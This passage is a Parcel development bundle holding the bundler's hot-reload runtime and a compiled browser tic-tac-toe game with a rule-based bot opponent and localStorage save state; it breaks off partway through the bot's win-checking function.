// modules are defined as an array
// [ module function, map of requires ]
//
// map of requires is short require name -> numeric require
//
// anything defined in a previous bundle is accessed via the
// orig method which is the require for previous bundles

(function (modules, entry, mainEntry, parcelRequireName, globalName) {
  /* eslint-disable no-undef */
  var globalObject =
    typeof globalThis !== 'undefined'
      ? globalThis
      : typeof self !== 'undefined'
      ? self
      : typeof window !== 'undefined'
      ? window
      : typeof global !== 'undefined'
      ? global
      : {};
  /* eslint-enable no-undef */

  // Save the require from previous bundle to this closure if any
  var previousRequire =
    typeof globalObject[parcelRequireName] === 'function' &&
    globalObject[parcelRequireName];

  var cache = previousRequire.cache || {};
  // Do not use `require` to prevent Webpack from trying to bundle this call
  var nodeRequire =
    typeof module !== 'undefined' &&
    typeof module.require === 'function' &&
    module.require.bind(module);

  function newRequire(name, jumped) {
    if (!cache[name]) {
      if (!modules[name]) {
        // if we cannot find the module within our internal map or
        // cache jump to the current global require ie. the last bundle
        // that was added to the page.
        var currentRequire =
          typeof globalObject[parcelRequireName] === 'function' &&
          globalObject[parcelRequireName];
        if (!jumped && currentRequire) {
          return currentRequire(name, true);
        }

        // If there are other bundles on this page the require from the
        // previous one is saved to 'previousRequire'. Repeat this as
        // many times as there are bundles until the module is found or
        // we exhaust the require chain.
        if (previousRequire) {
          return previousRequire(name, true);
        }

        // Try the node require function if it exists.
        if (nodeRequire && typeof name === 'string') {
          return nodeRequire(name);
        }

        var err = new Error("Cannot find module '" + name + "'");
        err.code = 'MODULE_NOT_FOUND';
        throw err;
      }

      localRequire.resolve = resolve;
      localRequire.cache = {};

      var module = (cache[name] = new newRequire.Module(name));

      modules[name][0].call(
        module.exports,
        localRequire,
        module,
        module.exports,
        this
      );
    }

    return cache[name].exports;

    function localRequire(x) {
      var res = localRequire.resolve(x);
      return res === false ? {} : newRequire(res);
    }

    function resolve(x) {
      var id = modules[name][1][x];
      return id != null ? id : x;
    }
  }

  function Module(moduleName) {
    this.id = moduleName;
    this.bundle = newRequire;
    this.exports = {};
  }

  newRequire.isParcelRequire = true;
  newRequire.Module = Module;
  newRequire.modules = modules;
  newRequire.cache = cache;
  newRequire.parent = previousRequire;
  newRequire.register = function (id, exports) {
    modules[id] = [
      function (require, module) {
        module.exports = exports;
      },
      {},
    ];
  };

  Object.defineProperty(newRequire, 'root', {
    get: function () {
      return globalObject[parcelRequireName];
    },
  });

  globalObject[parcelRequireName] = newRequire;

  for (var i = 0; i < entry.length; i++) {
    newRequire(entry[i]);
  }

  if (mainEntry) {
    // Expose entry point to Node, AMD or browser globals
    // Based on https://github.com/ForbesLindesay/umd/blob/master/template.js
    var mainExports = newRequire(mainEntry);

    // CommonJS
    if (typeof exports === 'object' && typeof module !== 'undefined') {
      module.exports = mainExports;

      // RequireJS
    } else if (typeof define === 'function' && define.amd) {
      define(function () {
        return mainExports;
      });

      // <script>
    } else if (globalName) {
      this[globalName] = mainExports;
    }
  }
})({"ShInH":[function(require,module,exports) {
"use strict";
var global = arguments[3];
var HMR_HOST = null;
var HMR_PORT = null;
var HMR_SECURE = false;
var HMR_ENV_HASH = "d6ea1d42532a7575";
module.bundle.HMR_BUNDLE_ID = "890e741a975ef6c8";
/* global HMR_HOST, HMR_PORT, HMR_ENV_HASH, HMR_SECURE, chrome, browser, globalThis, __parcel__import__, __parcel__importScripts__, ServiceWorkerGlobalScope */ /*::
import type {
  HMRAsset,
  HMRMessage,
} from '@parcel/reporter-dev-server/src/HMRServer.js';
interface ParcelRequire {
  (string): mixed;
  cache: {|[string]: ParcelModule|};
  hotData: mixed;
  Module: any;
  parent: ?ParcelRequire;
  isParcelRequire: true;
  modules: {|[string]: [Function, {|[string]: string|}]|};
  HMR_BUNDLE_ID: string;
  root: ParcelRequire;
}
interface ParcelModule {
  hot: {|
    data: mixed,
    accept(cb: (Function) => void): void,
    dispose(cb: (mixed) => void): void,
    // accept(deps: Array<string> | string, cb: (Function) => void): void,
    // decline(): void,
    _acceptCallbacks: Array<(Function) => void>,
    _disposeCallbacks: Array<(mixed) => void>,
  |};
}
interface ExtensionContext {
  runtime: {|
    reload(): void,
    getURL(url: string): string;
    getManifest(): {manifest_version: number, ...};
  |};
}
declare var module: {bundle: ParcelRequire, ...};
declare var HMR_HOST: string;
declare var HMR_PORT: string;
declare var HMR_ENV_HASH: string;
declare var HMR_SECURE: boolean;
declare var chrome: ExtensionContext;
declare var browser: ExtensionContext;
declare var __parcel__import__: (string) => Promise<void>;
declare var __parcel__importScripts__: (string) => Promise<void>;
declare var globalThis: typeof self;
declare var ServiceWorkerGlobalScope: Object;
*/ var OVERLAY_ID = "__parcel__error__overlay__";
var OldModule = module.bundle.Module;
function Module(moduleName) {
    OldModule.call(this, moduleName);
    this.hot = {
        data: module.bundle.hotData,
        _acceptCallbacks: [],
        _disposeCallbacks: [],
        accept: function(fn) {
            this._acceptCallbacks.push(fn || function() {});
        },
        dispose: function(fn) {
            this._disposeCallbacks.push(fn);
        }
    };
    module.bundle.hotData = undefined;
}
module.bundle.Module = Module;
var checkedAssets, acceptedAssets, assetsToAccept /*: Array<[ParcelRequire, string]> */ ;
function getHostname() {
    return HMR_HOST || (location.protocol.indexOf("http") === 0 ? location.hostname : "localhost");
}
function getPort() {
    return HMR_PORT || location.port;
} // eslint-disable-next-line no-redeclare
var parent = module.bundle.parent;
if ((!parent || !parent.isParcelRequire) && typeof WebSocket !== "undefined") {
    var hostname = getHostname();
    var port = getPort();
    var protocol = HMR_SECURE || location.protocol == "https:" && !/localhost|127.0.0.1|0.0.0.0/.test(hostname) ? "wss" : "ws";
    var ws = new WebSocket(protocol + "://" + hostname + (port ? ":" + port : "") + "/"); // Web extension context
    var extCtx = typeof chrome === "undefined" ? typeof browser === "undefined" ? null : browser : chrome; // Safari doesn't support sourceURL in error stacks.
    // eval may also be disabled via CSP, so do a quick check.
    var supportsSourceURL = false;
    try {
        (0, eval)('throw new Error("test"); //# sourceURL=test.js');
    } catch (err) {
        supportsSourceURL = err.stack.includes("test.js");
    } // $FlowFixMe
    ws.onmessage = async function(event) {
        checkedAssets = {} /*: {|[string]: boolean|} */ ;
        acceptedAssets = {} /*: {|[string]: boolean|} */ ;
        assetsToAccept = [];
        var data = JSON.parse(event.data);
        if (data.type === "update") {
            // Remove error overlay if there is one
            if (typeof document !== "undefined") removeErrorOverlay();
            let assets = data.assets.filter((asset)=>asset.envHash === HMR_ENV_HASH); // Handle HMR Update
            let handled = assets.every((asset)=>{
                return asset.type === "css" || asset.type === "js" && hmrAcceptCheck(module.bundle.root, asset.id, asset.depsByBundle);
            });
            if (handled) {
                console.clear(); // Dispatch custom event so other runtimes (e.g React Refresh) are aware.
                if (typeof window !== "undefined" && typeof CustomEvent !== "undefined") window.dispatchEvent(new CustomEvent("parcelhmraccept"));
                await hmrApplyUpdates(assets);
                for(var i = 0; i < assetsToAccept.length; i++){
                    var id = assetsToAccept[i][1];
                    if (!acceptedAssets[id]) hmrAcceptRun(assetsToAccept[i][0], id);
                }
            } else fullReload();
        }
        if (data.type === "error") {
            // Log parcel errors to console
            for (let ansiDiagnostic of data.diagnostics.ansi){
                let stack = ansiDiagnostic.codeframe ? ansiDiagnostic.codeframe : ansiDiagnostic.stack;
                console.error("\uD83D\uDEA8 [parcel]: " + ansiDiagnostic.message + "\n" + stack + "\n\n" + ansiDiagnostic.hints.join("\n"));
            }
            if (typeof document !== "undefined") {
                // Render the fancy html overlay
                removeErrorOverlay();
                var overlay = createErrorOverlay(data.diagnostics.html); // $FlowFixMe
                document.body.appendChild(overlay);
            }
        }
    };
    ws.onerror = function(e) {
        console.error(e.message);
    };
    ws.onclose = function() {
        console.warn("[parcel] \uD83D\uDEA8 Connection to the HMR server was lost");
    };
}
function removeErrorOverlay() {
    var overlay = document.getElementById(OVERLAY_ID);
    if (overlay) {
        overlay.remove();
        console.log("[parcel] ✨ Error resolved");
    }
}
function createErrorOverlay(diagnostics) {
    var overlay = document.createElement("div");
    overlay.id = OVERLAY_ID;
    let errorHTML = '<div style="background: black; opacity: 0.85; font-size: 16px; color: white; position: fixed; height: 100%; width: 100%; top: 0px; left: 0px; padding: 30px; font-family: Menlo, Consolas, monospace; z-index: 9999;">';
    for (let diagnostic of diagnostics){
        let stack = diagnostic.frames.length ? diagnostic.frames.reduce((p, frame)=>{
            return `${p}
<a href="/__parcel_launch_editor?file=${encodeURIComponent(frame.location)}" style="text-decoration: underline; color: #888" onclick="fetch(this.href); return false">${frame.location}</a>
${frame.code}`;
        }, "") : diagnostic.stack;
        errorHTML += `
      <div>
        <div style="font-size: 18px; font-weight: bold; margin-top: 20px;">
          🚨 ${diagnostic.message}
        </div>
        <pre>${stack}</pre>
        <div>
          ${diagnostic.hints.map((hint)=>"<div>\uD83D\uDCA1 " + hint + "</div>").join("")}
        </div>
        ${diagnostic.documentation ? `<div>📝 <a style="color: violet" href="${diagnostic.documentation}" target="_blank">Learn more</a></div>` : ""}
      </div>
    `;
    }
    errorHTML += "</div>";
    overlay.innerHTML = errorHTML;
    return overlay;
}
function fullReload() {
    if ("reload" in location) location.reload();
    else if (extCtx && extCtx.runtime && extCtx.runtime.reload) extCtx.runtime.reload();
}
function getParents(bundle, id) /*: Array<[ParcelRequire, string]> */ {
    var modules = bundle.modules;
    if (!modules) return [];
    var parents = [];
    var k, d, dep;
    for(k in modules)for(d in modules[k][1]){
        dep = modules[k][1][d];
        if (dep === id || Array.isArray(dep) && dep[dep.length - 1] === id) parents.push([
            bundle,
            k
        ]);
    }
    if (bundle.parent) parents = parents.concat(getParents(bundle.parent, id));
    return parents;
}
function updateLink(link) {
    var newLink = link.cloneNode();
    newLink.onload = function() {
        if (link.parentNode !== null) // $FlowFixMe
        link.parentNode.removeChild(link);
    };
    newLink.setAttribute("href", link.getAttribute("href").split("?")[0] + "?" + Date.now()); // $FlowFixMe
    link.parentNode.insertBefore(newLink, link.nextSibling);
}
var cssTimeout = null;
function reloadCSS() {
    if (cssTimeout) return;
    cssTimeout = setTimeout(function() {
        var links = document.querySelectorAll('link[rel="stylesheet"]');
        for(var i = 0; i < links.length; i++){
            // $FlowFixMe[incompatible-type]
            var href = links[i].getAttribute("href");
            var hostname = getHostname();
            var servedFromHMRServer = hostname === "localhost" ? new RegExp("^(https?:\\/\\/(0.0.0.0|127.0.0.1)|localhost):" + getPort()).test(href) : href.indexOf(hostname + ":" + getPort());
            var absolute = /^https?:\/\//i.test(href) && href.indexOf(location.origin) !== 0 && !servedFromHMRServer;
            if (!absolute) updateLink(links[i]);
        }
        cssTimeout = null;
    }, 50);
}
function hmrDownload(asset) {
    if (asset.type === "js") {
        if (typeof document !== "undefined") {
            let script = document.createElement("script");
            script.src = asset.url + "?t=" + Date.now();
            if (asset.outputFormat === "esmodule") script.type = "module";
            return new Promise((resolve, reject)=>{
                var _document$head;
                script.onload = ()=>resolve(script);
                script.onerror = reject;
                (_document$head = document.head) === null || _document$head === void 0 || _document$head.appendChild(script);
            });
        } else if (typeof importScripts === "function") {
            // Worker scripts
            if (asset.outputFormat === "esmodule") return import(asset.url + "?t=" + Date.now());
            else return new Promise((resolve, reject)=>{
                try {
                    importScripts(asset.url + "?t=" + Date.now());
                    resolve();
                } catch (err) {
                    reject(err);
                }
            });
        }
    }
}
async function hmrApplyUpdates(assets) {
    global.parcelHotUpdate = Object.create(null);
    let scriptsToRemove;
    try {
        // If sourceURL comments aren't supported in eval, we need to load
        // the update from the dev server over HTTP so that stack traces
        // are correct in errors/logs. This is much slower than eval, so
        // we only do it if needed (currently just Safari).
        // https://bugs.webkit.org/show_bug.cgi?id=137297
        // This path is also taken if a CSP disallows eval.
        if (!supportsSourceURL) {
            let promises = assets.map((asset)=>{
                var _hmrDownload;
                return (_hmrDownload = hmrDownload(asset)) === null || _hmrDownload === void 0 ? void 0 : _hmrDownload.catch((err)=>{
                    // Web extension bugfix for Chromium
                    // https://bugs.chromium.org/p/chromium/issues/detail?id=1255412#c12
                    if (extCtx && extCtx.runtime && extCtx.runtime.getManifest().manifest_version == 3) {
                        if (typeof ServiceWorkerGlobalScope != "undefined" && global instanceof ServiceWorkerGlobalScope) {
                            extCtx.runtime.reload();
                            return;
                        }
                        asset.url = extCtx.runtime.getURL("/__parcel_hmr_proxy__?url=" + encodeURIComponent(asset.url + "?t=" + Date.now()));
                        return hmrDownload(asset);
                    }
                    throw err;
                });
            });
            scriptsToRemove = await Promise.all(promises);
        }
        assets.forEach(function(asset) {
            hmrApply(module.bundle.root, asset);
        });
    } finally{
        delete global.parcelHotUpdate;
        if (scriptsToRemove) scriptsToRemove.forEach((script)=>{
            if (script) {
                var _document$head2;
                (_document$head2 = document.head) === null || _document$head2 === void 0 || _document$head2.removeChild(script);
            }
        });
    }
}
function hmrApply(bundle, asset) {
    var modules = bundle.modules;
    if (!modules) return;
    if (asset.type === "css") reloadCSS();
    else if (asset.type === "js") {
        let deps = asset.depsByBundle[bundle.HMR_BUNDLE_ID];
        if (deps) {
            if (modules[asset.id]) {
                // Remove dependencies that are removed and will become orphaned.
                // This is necessary so that if the asset is added back again, the cache is gone, and we prevent a full page reload.
                let oldDeps = modules[asset.id][1];
                for(let dep in oldDeps)if (!deps[dep] || deps[dep] !== oldDeps[dep]) {
                    let id = oldDeps[dep];
                    let parents = getParents(module.bundle.root, id);
                    if (parents.length === 1) hmrDelete(module.bundle.root, id);
                }
            }
            if (supportsSourceURL) // Global eval. We would use `new Function` here but browser
            // support for source maps is better with eval.
            (0, eval)(asset.output);
             // $FlowFixMe
            let fn = global.parcelHotUpdate[asset.id];
            modules[asset.id] = [
                fn,
                deps
            ];
        } else if (bundle.parent) hmrApply(bundle.parent, asset);
    }
}
function hmrDelete(bundle, id) {
    let modules = bundle.modules;
    if (!modules) return;
    if (modules[id]) {
        // Collect dependencies that will become orphaned when this module is deleted.
        let deps = modules[id][1];
        let orphans = [];
        for(let dep in deps){
            let parents = getParents(module.bundle.root, deps[dep]);
            if (parents.length === 1) orphans.push(deps[dep]);
        } // Delete the module. This must be done before deleting dependencies in case of circular dependencies.
        delete modules[id];
        delete bundle.cache[id]; // Now delete the orphans.
        orphans.forEach((id)=>{
            hmrDelete(module.bundle.root, id);
        });
    } else if (bundle.parent) hmrDelete(bundle.parent, id);
}
function hmrAcceptCheck(bundle, id, depsByBundle) {
    if (hmrAcceptCheckOne(bundle, id, depsByBundle)) return true;
     // Traverse parents breadth first. All possible ancestries must accept the HMR update, or we'll reload.
    let parents = getParents(module.bundle.root, id);
    let accepted = false;
    while(parents.length > 0){
        let v = parents.shift();
        let a = hmrAcceptCheckOne(v[0], v[1], null);
        if (a) // If this parent accepts, stop traversing upward, but still consider siblings.
        accepted = true;
        else {
            // Otherwise, queue the parents in the next level upward.
            let p = getParents(module.bundle.root, v[1]);
            if (p.length === 0) {
                // If there are no parents, then we've reached an entry without accepting. Reload.
                accepted = false;
                break;
            }
            parents.push(...p);
        }
    }
    return accepted;
}
function hmrAcceptCheckOne(bundle, id, depsByBundle) {
    var modules = bundle.modules;
    if (!modules) return;
    if (depsByBundle && !depsByBundle[bundle.HMR_BUNDLE_ID]) {
        // If we reached the root bundle without finding where the asset should go,
        // there's nothing to do. Mark as "accepted" so we don't reload the page.
        if (!bundle.parent) return true;
        return hmrAcceptCheck(bundle.parent, id, depsByBundle);
    }
    if (checkedAssets[id]) return true;
    checkedAssets[id] = true;
    var cached = bundle.cache[id];
    assetsToAccept.push([
        bundle,
        id
    ]);
    if (!cached || cached.hot && cached.hot._acceptCallbacks.length) return true;
}
function hmrAcceptRun(bundle, id) {
    var cached = bundle.cache[id];
    bundle.hotData = {};
    if (cached && cached.hot) cached.hot.data = bundle.hotData;
    if (cached && cached.hot && cached.hot._disposeCallbacks.length) cached.hot._disposeCallbacks.forEach(function(cb) {
        cb(bundle.hotData);
    });
    delete bundle.cache[id];
    bundle(id);
    cached = bundle.cache[id];
    if (cached && cached.hot && cached.hot._acceptCallbacks.length) cached.hot._acceptCallbacks.forEach(function(cb) {
        var assetsToAlsoAccept = cb(function() {
            return getParents(module.bundle.root, id);
        });
        if (assetsToAlsoAccept && assetsToAccept.length) // $FlowFixMe[method-unbinding]
        assetsToAccept.push.apply(assetsToAccept, assetsToAlsoAccept);
    });
    acceptedAssets[id] = true;
}

},{}],"8lqZg":[function(require,module,exports) {
"use strict";
var __awaiter = this && this.__awaiter || function(thisArg, _arguments, P, generator) {
    function adopt(value) {
        return value instanceof P ? value : new P(function(resolve) {
            resolve(value);
        });
    }
    return new (P || (P = Promise))(function(resolve, reject) {
        function fulfilled(value) {
            try {
                step(generator.next(value));
            } catch (e) {
                reject(e);
            }
        }
        function rejected(value) {
            try {
                step(generator["throw"](value));
            } catch (e) {
                reject(e);
            }
        }
        function step(result) {
            result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected);
        }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = this && this.__generator || function(thisArg, body) {
    var _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    }, f, y, t, g;
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(g && (g = 0, op[0] && (_ = 0)), _)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
};
exports.__esModule = true;
var refs_1 = require("./scripts/refs");
var botCombo_1 = require("./scripts/botCombo");
var swal_1 = require("./scripts/swal");
var sounds_1 = require("./scripts/sounds");
require("./scripts/sounds");
var menu = refs_1.refs.menu, gameDiv = refs_1.refs.gameDiv, gameDivBot = refs_1.refs.gameDivBot, form = refs_1.refs.form, player1 = refs_1.refs.player1, player2 = refs_1.refs.player2, player1GameName = refs_1.refs.player1GameName, player2GameName = refs_1.refs.player2GameName, fieldies = refs_1.refs.fieldies, fieldiesBot = refs_1.refs.fieldiesBot, restartBtn = refs_1.refs.restartBtn, restartBtnBot = refs_1.refs.restartBtnBot, resetBtn = refs_1.refs.resetBtn, resetBtnBot = refs_1.refs.resetBtnBot, botStart = refs_1.refs.botStart;
var stepSound = sounds_1.sounds.stepSound, takenSound = sounds_1.sounds.takenSound;
var winningCombos = [
    [
        1,
        2,
        3
    ],
    [
        4,
        5,
        6
    ],
    [
        7,
        8,
        9
    ],
    [
        1,
        4,
        7
    ],
    [
        2,
        5,
        8
    ],
    [
        3,
        6,
        9
    ],
    [
        1,
        5,
        9
    ],
    [
        3,
        5,
        7
    ], 
];
var comboArray = (0, botCombo_1.createBotCombo)();
var currentComboX = [];
var currentComboO = [];
var currentSymbol = "X";
var activePlayer = "";
var player1Name = "Player I";
var player2Name = "Player II";
var isBotGame;
var victory = false;
if (form) form.addEventListener("submit", handleSubmit);
botStart === null || botStart === void 0 || botStart.addEventListener("click", startBotGame);
fieldies.forEach(function(fieldy) {
    fieldy.addEventListener("click", handlePlayerMove);
});
fieldiesBot.forEach(function(fieldy) {
    fieldy.addEventListener("click", handlePlayerMoveBot);
});
resetBtn === null || resetBtn === void 0 || resetBtn.addEventListener("click", reset);
resetBtnBot === null || resetBtnBot === void 0 || resetBtnBot.addEventListener("click", reset);
restartBtn === null || restartBtn === void 0 || restartBtn.addEventListener("click", function() {
    if (confirm("Are you sure you want to restart?")) restart();
});
restartBtnBot === null || restartBtnBot === void 0 || restartBtnBot.addEventListener("click", function() {
    if (confirm("Are you sure you want to restart?")) restart();
});
// player vs player
// game start
function handleSubmit(e) {
    e.preventDefault();
    isBotGame = false;
    setNames();
    showField(gameDiv);
    setPlayers(player1Name, player2Name);
}
function setNames() {
    player1Name = (player1 === null || player1 === void 0 ? void 0 : player1.value) || "Player I";
    player2Name = (player2 === null || player2 === void 0 ? void 0 : player2.value) || "Player II";
    localStorage.setItem("player1", player1Name);
    localStorage.setItem("player2", player2Name);
}
function showField(thumb) {
    menu === null || menu === void 0 || menu.classList.add("visually-hidden");
    thumb === null || thumb === void 0 || thumb.classList.remove("visually-hidden");
}
function setPlayers(name1, name2) {
    if (player1GameName && player2GameName) {
        player1GameName.innerText = "PlayerX: ".concat(name1);
        player2GameName.innerText = "PlayerO: ".concat(name2);
    }
}
//player makes a move
function handlePlayerMove(e) {
    var target = e.target;
    if (target.textContent === "") {
        paintSymbol(target);
        updateCombos(target);
        changeSymbol();
        swapPlayers();
        saveData();
    } else {
        takenSound.play();
        alert("This one is taken!");
    }
}
function paintSymbol(div) {
    div.innerText = currentSymbol;
    stepSound.play();
}
function updateCombos(target) {
    if (currentSymbol === "X") {
        currentComboX.push(Number(target.dataset.id));
        if (currentComboX.length > 2) checkForVictory(currentComboX);
    } else {
        currentComboO.push(Number(target.dataset.id));
        if (currentComboO.length > 2) checkForVictory(currentComboO);
    }
}
function checkForVictory(arr) {
    victory = !!winningCombos.find(function(combo) {
        return combo.every(function(num) {
            return arr.includes(num);
        });
    });
    if (victory) setTimeout(function() {
        return alertVictory(arr);
    }, 10);
    else checkForNoMoves();
}
function alertVictory(arr) {
    return __awaiter(this, void 0, void 0, function() {
        var wantsMore;
        return __generator(this, function(_a) {
            switch(_a.label){
                case 0:
                    if (!isBotGame) return [
                        3 /*break*/ ,
                        5
                    ];
                    if (!(arr === currentComboX)) return [
                        3 /*break*/ ,
                        2
                    ];
                    return [
                        4 /*yield*/ ,
                        (0, swal_1.createSwal)("Yahoo! You win! Another round?", true)
                    ];
                case 1:
                    wantsMore = _a.sent();
                    return [
                        3 /*break*/ ,
                        4
                    ];
                case 2:
                    return [
                        4 /*yield*/ ,
                        (0, swal_1.createSwal)("Oh no, bot won:( Looking for revenge?", false)
                    ];
                case 3:
                    wantsMore = _a.sent();
                    _a.label = 4;
                case 4:
                    return [
                        3 /*break*/ ,
                        7
                    ];
                case 5:
                    return [
                        4 /*yield*/ ,
                        (0, swal_1.createSwal)("".concat(activePlayer, " was crushed! Another round?"), true)
                    ];
                case 6:
                    wantsMore = _a.sent();
                    _a.label = 7;
                case 7:
                    if (wantsMore) reset();
                    else restart();
                    return [
                        2 /*return*/ 
                    ];
            }
        });
    });
}
function checkForNoMoves() {
    if (currentComboO.length === 4 && currentComboX.length === 5) {
        var wantsReset = confirm("Oh no, no more moves! Reset?");
        wantsReset ? reset() : restart();
    }
}
function changeSymbol() {
    currentSymbol = currentSymbol === "X" ? "O" : "X";
    localStorage.setItem("activePlayer", JSON.stringify(currentSymbol));
}
function swapPlayers() {
    if (activePlayer === "" || player1Name) activePlayer = player2Name;
    else activePlayer = player1Name;
    player1GameName === null || player1GameName === void 0 || player1GameName.classList.toggle("active-player");
    player2GameName === null || player2GameName === void 0 || player2GameName.classList.toggle("active-player");
}
function saveData() {
    localStorage.setItem("playerX", JSON.stringify(currentComboX));
    localStorage.setItem("playerO", JSON.stringify(currentComboO));
}
// check for saved progress
(function checkSaves() {
    var currentSaveX = localStorage.getItem("playerX");
    if (currentSaveX) {
        currentComboX = JSON.parse(currentSaveX);
        paintSaved("X", currentComboX);
    }
    var currentSaveO = localStorage.getItem("playerO");
    if (currentSaveO) {
        currentComboO = JSON.parse(currentSaveO);
        paintSaved("O", currentComboO);
    }
    var name1 = localStorage.getItem("player1");
    var name2 = localStorage.getItem("player2");
    if (name1 && name2) {
        setPlayers(name1, name2);
        showField(gameDiv);
    }
    var savedActive = localStorage.getItem("activePlayer");
    if (savedActive) currentSymbol = JSON.parse(savedActive);
})();
function paintSaved(N, arr) {
    fieldies.forEach(function(fieldy) {
        if (fieldy.dataset.id && arr.includes(+fieldy.dataset.id)) fieldy.innerText = N;
    });
}
//player vs bot
function startBotGame() {
    isBotGame = true;
    clearCombos();
    showField(gameDivBot);
}
function clearCombos() {
    currentComboO = [];
    currentComboX = [];
}
function handlePlayerMoveBot(e) {
    var target = e.target;
    if (target.textContent === "") {
        stopListening();
        paintSymbol(target);
        updateCombos(target);
        if (!victory) {
            currentSymbol = currentSymbol === "X" ? "O" : "X";
            if (currentSymbol === "O") botMove();
        }
    } else {
        takenSound.play();
        alert("This one is taken!");
    }
}
function stopListening() {
    fieldiesBot.forEach(function(fieldy) {
        return fieldy.removeEventListener("click", handlePlayerMoveBot);
    });
}
function startListening() {
    fieldiesBot.forEach(function(fieldy) {
        fieldy.addEventListener("click", handlePlayerMoveBot);
    });
}
function botMove() {
    var didntMakeAMove = true;
    if (!victory && didntMakeAMove) didntMakeAMove = checkPossibleWin(currentComboO);
    if (didntMakeAMove && !victory) didntMakeAMove = checkPossibleWin(currentComboX);
    if (didntMakeAMove && !victory) didntMakeAMove = counterAttack(currentComboX);
    if (didntMakeAMove && !victory) buildCombo(comboArray);
}
function handleBotMove(num) {
    setTimeout(function() {
        paintSymbol(fieldiesBot[num]);
        updateCombos(fieldiesBot[num]);
        currentSymbol = currentSymbol === "X" ? "O" : "X";
        startListening();
    }, 450);
}
//common
function reset() {
    if (isBotGame) {
        localStorage.clear();
        clearCombos();
        comboArray = (0, botCombo_1.createBotCombo)();
        setTimeout(function() {
            currentSymbol = "X";
            fieldiesBot.forEach(function(fieldy) {
                return fieldy.innerHTML = "";
            });
            victory = false;
            startListening();
        }, 0);
    } else {
        var placeholderName = localStorage.getItem("player1") || "Player II";
        player1Name = localStorage.getItem("player2") || "Player I";
        player2Name = placeholderName || "Player II";
        localStorage.removeItem("playerX");
        localStorage.removeItem("playerO");
        localStorage.removeItem("activePlayer");
        localStorage.setItem("player1", player1Name);
        localStorage.setItem("player2", player2Name);
        clearCombos();
        location.reload();
    }
}
function restart() {
    localStorage.clear();
    location.reload();
}
//bot move logic
function buildCombo(arr) {
    var num = arr.find(function(num) {
        return !fieldiesBot[num].innerText;
    });
    if (num || num === 0) handleBotMove(num);
}
function counterAttack(arr) {
    if (arr.includes(1) && !fieldiesBot[8].innerText) {
        handleBotMove(8);
        return;
    } else if (arr.includes(3) && !fieldiesBot[6].innerText) {
        handleBotMove(6);
        return;
    } else if (arr.includes(7) && !fieldiesBot[2].innerText) {
        handleBotMove(2);
        return;
    } else if (arr.includes(9) && !fieldiesBot[0].innerText) {
        handleBotMove(0);
        return;
    }
    return true;
}
function checkPossibleWin(arr) {
    if (arr === null || arr === void 0 ? void 0 : arr.includes(1)) {
        if (arr.includes(2) && !fieldiesBot[2].innerText) {
            handleBotMove(2);
            return;
        }
        if (arr.includes(3) && !fieldiesBot[1].innerText) {
            handleBotMove(1);
            return;
        }
        if (arr.includes(4) && !fieldiesBot[6].innerText) {
            handleBotMove(6);
            return;
        }
        if (arr.includes(7) && !fieldiesBot[3].innerText) {
            handleBotMove(3);
            return;
        }
        if (arr.includes(5) && !fieldiesBot[8].innerText) {
            handleBotMove(8);
            return;
        }
        if (arr.includes(9) && !fieldiesBot[4].innerText) {
            handleBotMove(4);
            return;
        }
    }
    if (arr === null || arr === void 0 ? void 0 : arr.includes(2)) {
        if (arr.includes(3) && !fieldiesBot[0].innerText) {
            handleBotMove(0);
            return;
        }
        if (arr.includes(5) && !fieldiesBot[7].innerText) {
            handleBotMove(7);
            return;
        }
        if (arr.includes(8) && !fieldiesBot[4].innerText) {
            handleBotMove(4);
            return;
        }
    }
    if (arr === null || arr === void 0 ? void 0 : arr.includes(3)) {
        if (arr.includes(6) && !fieldiesBot[8].innerText) {
            handleBotMove(8);
            return;
        }
        if (arr.includes(9) && !fieldiesBot[5].innerText) {
            handleBotMove(5);
            return;
        }
        if (arr.includes(5) && !fieldiesBot[6].innerText) {
            handleBotMove(6);
            return;
        }
        if (arr.includes(7) && !fieldiesBot[4].innerText) {
            handleBotMove(4);
            return;
        }
    }
    if (arr === null || arr === void 0 ? void 0 : arr.includes(4)) {
        if (arr.includes(5) && !fieldiesBot[5].innerText) {
            handleBotMove(5);
            return;
        }
        if (arr.includes(6) && !fieldiesBot[4].innerText) {
            handleBotMove(4);
            return;
        }
        if (arr.includes(7) && !fieldiesBot[0].innerText) {
            handleBotMove(0);
            return;
        }
    }
    if (arr === null || arr === void 0 ? void 0 : arr.includes(5)) {
        if (arr.includes(6) && !fieldiesBot[3].innerText) {
            handleBotMove(3);
            return;
        }
        if (arr.includes(8) && !fieldiesBot[1].innerText) {
            handleBotMove(1);
            return;
        }
        if (arr.includes(9) && !fieldiesBot[0].innerText) {
            handleBotMove(0);
            return;
        }
        if (arr.includes(7) && !fieldiesBot[2].innerText) {
            handleBotMove(2);
            return;
        }
    }
